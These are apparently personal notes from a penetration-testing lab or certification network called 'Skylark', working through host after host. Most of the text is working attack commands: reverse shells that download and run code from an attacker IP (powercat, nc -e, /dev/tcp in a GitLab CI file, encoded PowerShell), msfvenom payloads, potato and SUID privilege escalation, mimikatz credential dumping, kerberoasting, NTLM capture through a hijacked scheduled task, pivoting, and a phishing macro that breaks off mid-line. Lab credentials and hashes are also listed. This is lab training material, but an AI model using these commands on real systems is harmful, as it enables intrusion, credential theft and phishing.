```bash
nmap 192.168.240.220-227 192.168.240.250
```

.250
```bash
nmap 192.168.240.250
nmap -sT -A -p 5040,49664 192.168.240.250
sudo nmap -O 192.168.240.250 --osscan-guess
sudo nmap -sU --open -p 161 192.168.240.250

# only ports open (no snmp): 135,139,445,3389,5040,49664-49670
```

.220 - (Skylark Partner Portal)
```bash
nmap 192.168.240.220

# ports open: 80,135,139,445,5900(vnc),5985,47001(winrm),49664-49670
nmap -sT -A -p 80 192.168.186.220

# enumerate vnc, cannot connect
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900 192.168.240.220
hydra -s 5900 -P /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt -t 16 192.168.240.220 vnc
vncviewer 192.168.229.220::5901

# enumerate smb - we need a password to do anything
enum4linux 192.168.240.220
nmap -v -p 139,445 --script smb-os-discovery 192.168.240.220
smbclient -L 192.168.186.220 -U skylark
smbmap -H 192.168.240.220

# enumerate webserver
# cracking using the 10million will take way too long, smaller lists have no effect
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt -s 80 -f 192.168.240.220 http-get /
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://skylark:User+dcGvfwTbjV[]@192.168.186.220
feroxbuster --wordlist /usr/share/wordlists/dirb/big.txt --url http://skylark:User+dcGvfwTbjV[]@192.168.186.220

# we got creds from .11 for the partner portal
skylark:User+dcGvfwTbjV[]

# test for path traversal
http://192.168.229.220/download?filename=../../../../../../../../../../../inetpub/wwwroot/web.config

http://192.168.229.220/download?filename=../../../../../../../../../../../inetpub/wwwroot/appsettings.json

http://192.168.229.220/download?filename=../../../../../../../../../../../C:/Uploads/f63a20c6test2.ps1
http://192.168.229.220/download?filename=../../../../../../../../../../../Uploads/f63a20c6test2.ps1

# obtain admin creds
skylark_admin
Admin!_xDHj88vAnS!__

# with admin creds look  for directories again
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://skylark_admin:Admin!_xDHj88vAnS!__@192.168.229.220

# find /configuration
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.45.229 lport=443 -f psh-reflection -o shell.ps1

# partner creds
partner:Skylark__ChangingTheWorld!

http://192.168.229.220/upload
http://192.168.229.220/configuration

C:\Uploads\ddda527bshell3.ps1

http://192.168.229.220/download?filename=f63a20c6test2.ps1

echo "Hello" | pandoc -o out2.docx

# used this one for the ps1 shell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.229/powercat.ps1');powercat -c 192.168.45.229 -p 443 -e cmd

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.229 LPORT=443 -f exe > rev443.exe

Get-ChildItem -Path C:\ -Include *.ini -File -Recurse -ErrorAction SilentlyContinue

# find vnc file
cat C:\"Program Files"\"uvnc bvba"\UltraVNC\ultravnc.ini

# obtain vnc password hashes
passwd=BFE825DE515A335BE3
passwd2=59A04800B111ADB060

# decrypt using vncpasswd python script - https://github.com/trinitronx/vncpasswd.py
git clone https://github.com/trinitronx/vncpasswd.py.git vncpasswd.py
cd vncpasswd.py
python2 ./vncpasswd.py --help
python2 ./vncpasswd.py --decrypt 59A04800B111ADB060 --hex
# use the bin result - ABCDEFGH
python2 ./vncpasswd.py --decrypt BFE825DE515A335BE3 --hex
# R3S3+rcH
```
.220 privesc
```bash
# we have SeImpersonate
# using EFS potato we can get a root shell on 9999
iwr -uri http://192.168.45.229/efspotato.cs -Outfile efspotato.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
iwr -uri http://192.168.45.229/nc.exe -Outfile nc.exe

.\efspotato.exe "nc.exe 192.168.45.229 9999 -e cmd"
```

.221 (austin02.SKYLARK.com)
```bash
nmap 192.168.240.221
nmap -sT -A -p 80,443 192.168.248.221
sudo nmap -sU --open -p 161 192.168.248.221
sudo nmap -p- -Pn 192.168.248.221 -sS -T 5 --verbose
# port 80,443,135,139,445,3387,5504,5985(wsman) open
# also port 47001,49664,49665,49666,49667,49668,49670-75,49680

# enumerate port 10000 (i don't think it's actually ndmp, but another rdp port)
nmap -n -sV --script "ndmp-fs-info or ndmp-version" -p 10000 192.168.240.221

# enumerate smb - we need a password to do anything
enum4linux 192.168.240.221
nmap -v -p 139,445 --script smb-os-discovery 192.168.240.221
smbclient -L 192.168.240.221
smbmap -H 192.168.240.221

# enumerate webserver
nikto -host 192.168.248.221 -port 80
whatweb http://192.168.248.221:80
gobuster dir -u http://192.168.240.221:80 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt --url http://192.168.248.221 --dont-scan /aspnet_client,/Aspnet_client,/Aspnet_Client,/aspnet_Client,/ASPNET_CLIENT
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt --url http://192.168.248.225:8090/backend/default

# login to webserver on https://192.168.248.221/RDWeb with creds from the pdf on 225
SKYLARK\kiosk - XEwUS^9R2Gwt8O914

# use this command for initial access. Click on 'austin02' link, then open cmd.exe from the filesystem
xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.229.221

xfreerdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.186.221

# get a better shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=9999 -f exe -o shell.exe
nc -nvlp 8888
iwr -uri http://192.168.45.217:8000/shell8888.exe -Outfile shell.exe
.\shell.exe
```

.221 privesc
```bash
iwr -uri http://192.168.45.217/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# findings
type C:\Users\kiosk\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
kiosk has a .ssh directory

# find that we have an internal interface with some ports running on it
ipconfig /all
netstat -ano
10.10.76.254:139
10.10.76.254:40000
10.10.76.254:57215 

chisel server --port 80 --reverse
sudo tcpdump -nvvvXi tun0 tcp port 8081
iwr -uri http://192.168.45.217/chisel.exe -Outfile chisel.exe

.\chisel.exe client 192.168.45.217:80 R:40000:10.10.76.254:40000
# connect to this port locally, can't access from browser
nc 127.0.0.1 40000

# create another shell on the target to exploit command injection
cd C:\temp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=8888 -f exe -o shell8888.exe
nc -nvlp 9999
iwr -uri http://192.168.45.217:8000/shell8888.exe -Outfile shell.exe

# from the prompt on 40000 write config to inject the shell to get admin
write_config 123';c:\temp\shell.exe '123

# doesn't work, apparently not a domain user
iwr -uri http://192.168.45.217:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:/Users/michelle

# mimikatz
iwr -uri http://192.168.45.217:8000/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
token::elevate
lsadump::sam

MSSQL$MICROSOFT##WID
fdb2ea0d22188397bdc0f08ba4081549

Administrator
17add237f30abaecc9d884f72958b928

# kerberoast
# NOTE: need to be NT/authority system
iwr -uri http://192.168.45.217:8000/Invoke-Kerberoast.ps1 -Outfile Invoke-Kerberoast.ps1
powershell -ep bypass
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -Domain skylark.com

# using EFS potato we can get a root shell on 9999
iwr -uri http://192.168.45.217:8000/efspotato.cs -Outfile efspotato.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
iwr -uri http://192.168.45.217:8000/nc.exe -Outfile nc.exe
.\efspotato.exe "whoami"
.\efspotato.exe "nc.exe 192.168.45.217 7777 -e cmd"

# backup_service: It4Server
sudo hashcat -m 13100 backup.kerberoast /usr/share/wordlists/rockyou.txt --force
```

.221 pivot -> .10 -> pivot to .111, .110
```bash
# from kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# from proxy on kali
>> session
>> start

# add route to internal network
sudo ip route add 10.10.84.0/24 dev ligolo

# from windows target C:/Users/kiosk
iwr -uri http://192.168.45.229/agent.exe -Outfile agent.exe
./agent.exe -ignore-cert -connect 192.168.45.229:11601

# 22,5901
sudo nmap -p- -Pn 10.10.119.10 -sS -T 5 --verbose

# 445, 5985
sudo nmap -p- -Pn 10.10.76.11 -sS -T 5 --verbose

impacket-smbclient backup_service@10.10.76.11
crackmapexec smb 10.10.76.11 -u backup_service -p It4Server --continue-on-success
crackmapexec smb -u backup_service -p 'It4Server' -X "whoami" 10.10.76.11
crackmapexec winrm 10.10.76.11 -u backup_service -p It4Server --continue-on-success --local-auth

#22,139,445,8080
sudo nmap -p- -Pn 10.10.76.12 -sS -T 5 --verbose

sudo nmap -p- -Pn 10.10.76.13 -sS -T 5 --verbose
crackmapexec smb 10.10.76.13 -u backup_service -p It4Server --continue-on-success
crackmapexec winrm 10.10.76.13 -u backup_service -p It4Server --continue-on-success
impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76.13 

```

.10
```bash
# 22,5901
sudo nmap -p- -Pn 10.10.119.10 -sS -T 5 --verbose
vncviewer 10.10.84.10::5901
# need password from 220 - the first password works
passwd=R3S3+rcH
passwd2=ABCDEFGH
```

.10 privesc
```bash
sudo -l
# have sudo on ss and ip
https://gtfobins.github.io/gtfobins/ip/#sudo
sudo ip netns add foo
sudo ip netns exec foo /bin/bash
```

.10 -> .14 (another level of internal network) (CICD)
```bash
# in research dir add shell command
vi scratchpad/.gitlab-ci.yml

# setup pivot to 14 - use this guide to double pivot https://4pfsec.com/ligolo
# add listener on existing session
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# download agent on the second machine
wget http://192.168.45.229/agent -O agent
chmod +x agent
# connect to the first machine we proxied to from kali
./agent -connect 192.168.194.221:11601 -ignore-cert

# try this ifcant connect to 11601
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:11601 --tcp
./agent -connect 192.168.229.221:8000 -ignore-cert
# from kali
session
# switch to newly added session

# add route to access
sudo ip route add 10.20.119.0/24 dev ligolo

# verify connectivity
nmap 10.20.84.14 -p 80  

# get shell on 14
cd scratchpad
nano .gitlab-ci.yml
# add to one of the steps - will be executed on git push
/bin/bash -l > /dev/tcp/192.168.45.229/7777 0<&1 2>&1
git add .
git commit -m 'update ci'
git push origin main

# creds for pushing to git
root
glpat-PzrxBe-5Js7c3t7hoq4X
```

.14 privesc (CICD)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

# get better shell
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.229 LPORT=4444 -f raw -o shell.sh
wget http://192.168.45.229/shell.sh -O shell.sh

wget http://192.168.45.229/linpeas.sh -O linpeas.sh

# don't seem to do anything
research@skylark.com
gitlab-ci-token
WA82ZcgSY4_Gft7c8bzF

# running as root
/usr/bin/gitlab-runner run --working-directory /home/gitlab-runner --config /etc/gitlab-runner/config.toml --service gitlab-runner --user gitlab-runner
runsvdir -P /opt/gitlab/service log
/home/gitlab-runner/.local/share/gvfs-metadata/root-8a0803bc.log

wget http://192.168.45.229/pspy64 -O pspy

/opt/gitlab/embedded/bin/postgres -D /var/opt/gitlab/postgresql/data 
/opt/gitlab/embedded/bin/postgres_exporter --web.listen-address=localhost:9187 --extend.query-path=/var/opt/gitlab/postgres-exporter/queries.yaml 

find . -name local.txt 2>/dev/null
/bin/bash /opt/fs_checks/fs.sh

# modify the helper for this script
cat /opt/fs_checks/fs.sh
cat /opt/u/__fs.sh

# get a root shell - workaround for not being able to do interactive terminal
cd  /home/gitlab-runner
cp /opt/u/__fs.sh /home/gitlab-runner
sed -i '/EXPECTED_USERS="54"/a \/bin\/bash -l > \/dev\/tcp\/192.168.45.229\/5555 0<&1 2>&1' __fs.sh
cat __fs.sh > /opt/u/__fs.sh

# findings from root linpeas
 "email"=>"development@skylark.com",
 "encrypted_password"=>
  "$2a$10$.B9bs.xb808RvTrgouKgAeMA9HQtNEU8/M6ajyWFJeAYdwEnmpADK",

```

with double-pivot to x.20 scan other machines
```bash
nmap 10.20.84.15 10.20.84.110 10.20.84.111
```

.15 (PREPROD)
```bash
# ports open: 80,445,1433(mssql)
# we can login with domain admin creds
crackmapexec smb 10.20.84.15 -u backup_service -p It4Server --continue-on-success
crackmapexec smb 10.20.84.15 -u backup_service -p 'It4Server' -X "whoami"
# shell on 5555
crackmapexec smb 10.20.84.15 -u backup_service -p 'It4Server' -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA5ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

# if we can't run git commands on the target we can dump the stuff to our kali without needing login creds
# from /home/kali
python3 git_dumper.py http://10.20.84.15 /home/kali/skylark/git-15
# found this commit from head main logs
git show c6bf001b02514f865f872996d20dc89da7b26287

# get mssql creds
username: sa
password: FrogColossusMad1
database: master

Get-Childitem -recurse -filter "TODO.txt" -ErrorAction SilentlyContinue
# get creds for ARCHIVE machine (12)
admin:Complex__1__Password!
```

.110
```bash
# ports open: 445,3389
# since backup_service is domain admin, check to see if creds work. they do and we can login using psexec
crackmapexec smb 10.20.84.110 -u backup_service -p It4Server --continue-on-success
impacket-psexec backup_service:It4Server@10.20.84.110

# find proof.txt, can't pass directory so need to be in C:\Users
Get-Childitem -recurse -filter "proof.txt" -ErrorAction SilentlyContinue
Get-Childitem -recurse -filter "local.txt" -ErrorAction SilentlyContinue

# download mimikatz
iwr -uri http://192.168.45.229/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
token::elevate
lsadump::sam

# NTLM hashes found
k.smith
d2a87ca4d6735870dc2357a83960c379

offsec
7f87fb27f65463aca8630598c49c6de3
```

.111
```bash
nmap 10.20.84.111
crackmapexec smb 10.20.84.111 -u backup_service -p It4Server --continue-on-success
crackmapexec smb 10.20.84.111 -u backup_service -p 'It4Server' -X "whoami"
# shell on 5555
crackmapexec smb 10.20.84.111 -u backup_service -p 'It4Server' -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA5ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

# find proof.txt, can't pass directory so need to be in C:\Users
Get-Childitem -recurse -filter "proof.txt" -ErrorAction SilentlyContinue
Get-Childitem -recurse -filter "local.txt" -ErrorAction SilentlyContinue

# post enum - we see a scheduled task that connects to an smb server. we can modify it, so we can replace this with our smb server to capture a user and NTLM hash
# NOTE: the creds are used on .250
Get-ScheduledTask
# find a C:\setup\setup.ps1
# contains pw: #NexusRoleLintel835 (dont need this though)

# create a file setup.ps1 on kali that contains
dir \\192.168.45.229\smb
# copy it to the
cd C:\setup
mv setup.ps1 setup.ps1.bak
iwr -uri http://192.168.45.229/setup.ps1 -Outfile setup.ps1

# catch the NTLM hash with our smb connection
sudo impacket-smbserver -smb2support smb smb

# paste the entire thing into a file to crack
helpdesk_setup::SKYLARK:aaaaaaaaaaaaaaaa:259b6b083297b7777cd6713b2766a120:01010000000000008032397ec139da01bb964f7b83ac456e000000000100100045004b005700580061004400680065000300100045004b00570058006100440068006500020010004500420063004c005200470075004800040010004500420063004c005200470075004800070008008032397ec139da0106000400020000000800300030000000000000000000000000200000cafcc465713c4f92e202c5796c5cad4b07db33d76f429e7c0ed99f71ed5eae4d0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200320039000000000000000000

# obtain password helpdesk_setup:Tuna6Helper
hashcat -m 5600 helpdesk.hash /usr/share/wordlists/rockyou.txt --force
```

.11
```bash
crackmapexec smb 10.10.76.11 -u backup_service -p 'It4Server' -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

# from backup share obtained
ftp_jp:~be<3@6fe1Z:2e8
# creds for partner portal (220)

powershell.exe -c 'Get-ChildItem -Path C:\ -Filter local.txt -Recurse -ErrorAction SilentlyContinue -Force'
```

.12 (archive) (10.10.84.12)
```bash
# obtained creds: admin:Complex__1__Password!
nmap -Pn 10.10.84.12

# ssh does not work
ssh admin@10.10.84.12

# domain admin creds do not work, neither does admin
crackmapexec smb 10.10.84.12 -u admin -p "Complex__1__Password\!" --continue-on-success

# use admin creds on web page
http://10.10.84.12:8080/files/

# linux or windows? windows
nmap -sT -A -p 8080 -Pn 10.10.84.12
sudo nmap 10.10.84.12 --osscan-guess -Pn
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://10.10.84.12:8080

# linux commands appear to work in the admin panel
ls /bin/bash pwd nc ncat /usr/bin/ncat wget curl cd
# i used these
ncat nc /bin/bash
# test these step by step
whoami
ifconfig
wget http://192.168.45.229/shell.php
# shells https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
nc -e /bin/sh 192.168.45.229 1234
nc -c bash 192.168.45.229 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.229 1234 >/tmp/f
# this one finally works
ncat 192.168.45.229 1234 -e /bin/bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

```

.12 privesc
```bash
wget http://192.168.45.229/linpeas.sh -O linpeas.sh
/usr/sbin/CRON -f
/bin/bash /root/.scripts/tmp_s.sh 

echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/s

# we should have found this connecting UNIX-CLIENT using pspy
# connect to it to dump root password (BreakfastVikings999)
nc -vlU /tmp/s

grep --color=auto -rnw '/home/archive' -iIe "PASSWORD" --color=always 2>/dev/null
grep --color=auto -rnw '/' -iIe "f.miller" --color=always 2>/dev/null

summer12
test:password123
lance:circus5
baop_user:CSHrckxgVskAuVEwB0gZ
s.ahmed:WelcomeToSkyl4rk!

Reimbursement Process:
- List your expenses in an Excel document
- Send it to f.miller@skylark.com
- You'll get a decision in the next 3-5 days

```

.13 - mail server use for phishing
```bash
sudo nmap -p- -Pn 10.10.76.13 -sS -T 5 --verbose
crackmapexec smb 10.10.76.13 -u backup_service -p It4Server --continue-on-success
crackmapexec winrm 10.10.76.13 -u backup_service -p It4Server --continue-on-success
impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76.13 

crackmapexec smb 10.10.76.13 -u backup_service -p 'It4Server' -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

# test - s.ahmed:WelcomeToSkyl4rk!
sudo swaks -t f.miller@skylark.com --from s.ahmed@skylark.com --server 10.10.84.13 --body "test" --header "Hi" --suppress-data -ap

sudo swaks -t f.miller@skylark.com --from s.ahmed@skylark.com --attach book.xls --server 10.10.84.13 --body "expenses" --header "Expenses" --suppress-data -ap

# log into winprep
# need to use the installer from C:\Tools to use microsoft office
msfvenom -p windows/meterpreter/reverse_tcp lhost=KALI_IP lport=443 -f psh-cmd
msfvenom -p windows/shell/reverse_tcp lhost=192.168.45.229 lport=443 -f psh-cmd

xfreerdp /cert-ignore /u:offsec /p:lab /v:192.168.194.250

# serve up install.lnk and config.Library-ms from webdav
mkdir /home/kali/relia/webdav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/

# serve up powercat.ps1 from 8000
python3 -m http.server 8000

sudo msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.45.229
set LPORT 443
set ExitOnSession false
run -j

# when connected to from target
sessions
sessions -i 1
shell
powershell

impacket-smbserver -smb2support smb smb 
net use \\192.168.45.229\smb
copy "Book1.xls" \\192.168.45.229\smb
```

macro (name it MyMacro)
```
Sub Auto_Open()
    MyMacro
End Sub

Sub Workbook_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "%COMSPEC% /b /c start /b /min powershell.exe -nop "
